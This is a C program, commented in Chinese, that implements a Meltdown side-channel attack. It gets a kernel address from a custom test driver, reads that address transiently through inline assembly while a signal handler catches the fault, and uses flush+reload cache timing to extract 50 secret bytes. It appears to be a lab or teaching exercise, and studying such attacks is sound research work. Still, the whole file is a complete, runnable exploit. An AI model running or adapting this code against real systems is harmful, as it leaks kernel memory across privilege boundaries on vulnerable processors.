#define _GNU_SOURCE

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h> 
#include <stdio.h>
#include <x86intrin.h>
#include <signal.h>
#include <ucontext.h>
#include <sched.h>

//在Linux下测试驱动程序memdev.c，并得出将要攻击的目标地址
#define IOCTL 0
unsigned long long test_memdev(){
    printf("\n******************** test memdev ********************\n");

    //打开驱动程序文件
    int fd = 0;
    char* memdev = "/dev/memdev0";
    fd = open(memdev, O_RDONLY);
    printf("fd = %d\n", fd);

    //执行驱动程序的ioctl
    int ioctl_result = 0;
    ioctl_result = ioctl(fd, IOCTL);
    printf("ioctl_result = %d\n", ioctl_result);

    //执行驱动程序的read（读出来的数据为64位地址）
    int data_count = 0, i = 0;
    unsigned char data[8];
    unsigned long long address = 0;
    for(i=0; i<8; i++) data[i] = 0;
    data_count = read(fd, data, sizeof(data));
    printf("data_count = %d\n", data_count);
    printf("data =");
    for(i=0; i<8; i++) printf(" 0x%02x", data[i]);
    printf("\n");
    for(i=0; i<8; i++) address += (((unsigned long long)data[i])<<(i*8));
    printf("address = 0x%016llx\n", address);

    //关闭驱动程序文件
    int close_result = 0;
    close_result = close(fd);
    printf("close_result = %d\n", close_result);

    printf("*****************************************************\n\n");
    return address;
}

//预设的L3缓存行大小
#define Cache_Line 4096

//非法访问存储器的信号处理函数
extern char TAG[];
static void Sighandler(int signo, siginfo_t *siginfo, void *context)
{
    //用p_context指向的结构体来标识返回时进程的上下文/环境
    ucontext_t* p_context = context;
    //将寄存器rip赋值为TAG标签的地址（函数返回后程序将跳转至TAG标签处继续执行）
    p_context->uc_mcontext.gregs[REG_RIP] = (unsigned long long)TAG;
}

//用于做攻击的存储/地址空间（前后各留出1段空间用作存储/地址隔离，取中间的1～256段进行操作）
static char test[258*Cache_Line];
//访问非法地址的数据，触发异常，但是乱序执行会把后续指令的相关地址载入缓存，且不会回滚冲刷（Meltdown攻击的核心）
static void attack_core(unsigned long long target_address){
    asm volatile(
        ".rept 50\n\t"
	"add $0x0, %%rax\n\t"
	".endr\n\t"
    
        "mov $test, %%rbx\n\t"
        "add $0x1000, %%rbx\n\t"

        "xor %%rax, %%rax\n\t"
        "retry:\n\t"
        "movb (%[address]), %%al\n\t"
	"shl $0xc, %%rax\n\t"
        "jz retry\n\t"
	"movq (%%rbx, %%rax, 0x1), %%rbx\n\t"
    
        "TAG:"
        :
        :[address] "r" (target_address)
        :"rax", "rbx"
    );
    /*
    上述汇编代码第一到第三行：给寄存器rax加上50次0，固定CPU状态机的状态，与之前的各种操作做隔离

    上述汇编代码第四行：将数组test的首地址放入寄存器rbx
    上述汇编代码第五行：给寄存器rbx加上4096（前面留出1段空间用作存储/地址隔离）

    上述汇编代码第六行：将寄存器rax的64位数据清0
    上述汇编代码第七行：retry标签（用于优化CPU状态机中存在的“趋零固有偏向”）
    上述汇编代码第八行：对目标地址进行非法访问，将其中的字节数据放入寄存器al（寄存器rax的低8位）
    上述汇编代码第九行：将寄存器rax左移12位，相当于乘上4096（该乘数至少为一个Cache_Line的大小，否则攻击中使用的相邻存储地址会相互影响）
    上述汇编代码第十行：寄存器rax为0时跳转至retry标签（用于优化CPU状态机中存在的“趋零固有偏向”）
    上述汇编代码第十一行：将非法访问的数据作为新地址的一部分，再访问新地址(rbx+rax*0x1)中的数据以将其载入缓存

    上述汇编代码第十二行：TAG标签，从非法访问存储器的信号处理函数中返回的跳转点
    */
}

//计时差值（以时钟周期数为单位）数组、最小计时差值和其对应的数组索引
static int difference[256], min_difference[500];
static unsigned char min_index[500];
//Meltdown攻击
void attack(unsigned long long target_address){
    //计时开始点和计时结束点
    unsigned long long start = 0, end = 0;
    int i = 0;

    //打开目标内核模块的文件，将其载入用户进程的地址空间
    int fd = open("/dev/memdev0", O_RDONLY);
    unsigned char data[8];
    read(fd, data, sizeof(data));
 
    //清空缓存
    for(i=1; i<257; i++) _mm_clflush((const void*)(test+i*Cache_Line));

    //执行Meltdown的核心攻击
    attack_core(target_address);
    
    //遍历用于做攻击的存储/地址空间，记录计时差值（存储访问时间）
    for(i=1; i<257; i++){
        //清空流水线（20个nop指令）
        asm volatile("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop");
        //开始计时
        start = __rdtsc();
        //保证指令不被乱序执行，充当“围栏”作用
        _mm_mfence(); 
        //访存操作
        test[i*Cache_Line] = 1;
        //保证指令不被乱序执行，充当“围栏”作用
        _mm_mfence(); 
        //结束计时
        end = __rdtsc();
        //保证指令不被乱序执行，充当“围栏”作用
        _mm_mfence(); 
        //计算计时差值
        difference[i-1] = end-start;
    }

    //关闭目标内核模块的文件
    close(fd);
}

//执行Meltdown攻击，窃取秘密信息
void main(){
    //被攻击的目标地址
    unsigned long long target_address = 0;
    //秘密信息字节数组和其中字节的概率性计数
    char secret[50];
    int probability_count[256];
    //最小计时差值的时间均值
    float average_min_difference = 0;
    //最大概率的字节值
    int max_probability = 0;
    int i = 0, j = 0, k = 0;

    //初始化数组test、diffeence、min_difference、min_index、secret和probability_count
    for(i=0; i<258*Cache_Line; i++) test[i] = 0;
    for(i=0; i<256; i++){
        difference[i] = 0;
        probability_count[i] = 0;
    }
    for(i=0; i<500; i++){
        min_difference[i] = 2147483647;
        min_index[i] = 0;
    }
    for(i=0; i<50; i++) secret[i] = 0;

    //注册非法访问存储器的信号处理函数
    struct sigaction sighandler = {
	.sa_sigaction = Sighandler,
	.sa_flags = SA_SIGINFO,
    };
    sigaction(SIGSEGV, &sighandler, NULL);

    //得出将要攻击的目标地址
    target_address = test_memdev();
    printf("******************** meltdown start ********************\n");
    printf("target_address = 0x%016llx\n", target_address);

    //对目标地址的50个字节分别做攻击
    for(k=0; k<50; k++){
        //做500次攻击，得出500个最小计时差值和500个其对应的数组索引，取小于等于时间均值的最多数组索引为秘密信息字节
        for(i=0; i<500; i++){
            attack(target_address);
            //找出最小计时差值和其对应的数组索引
            for(j=0; j<256; j++){
                if(difference[j]<min_difference[i]){
                    min_difference[i] = difference[j];
                    min_index[i] = j;
                }
            }
        }

        //以“小于等于时间均值的最多数组索引”为原则找出秘密信息
        for(i=0; i<500; i++) average_min_difference += min_difference[i];
        average_min_difference /= 500;
        for(i=0; i<500; i++)
            if(min_difference[i]<=average_min_difference) probability_count[min_index[i]]++;
        for(i=0; i<256; i++)
            if(probability_count[i]>max_probability){
                max_probability = probability_count[i];
                secret[k] = i;
            }
        //将循环重用变量还原
        for(i=0; i<500; i++) min_difference[i] = 2147483647;
        average_min_difference = 0;
        for(i=0; i<256; i++) probability_count[i] = 0;
        max_probability = 0;
        printf("secret[%d] = %c\n", k, secret[k]);
        
        //对下个字节继续进行攻击
        target_address += 1;
    }

    printf("********************* meltdown end *********************\n\n");
}
